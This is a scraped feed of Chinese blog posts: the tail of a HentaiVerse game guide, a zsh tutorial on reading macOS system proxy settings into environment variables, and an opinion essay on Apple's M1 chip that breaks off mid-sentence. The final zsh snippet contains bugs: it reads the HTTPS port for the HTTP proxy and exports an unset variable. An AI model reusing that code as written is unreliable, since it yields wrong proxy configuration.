社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 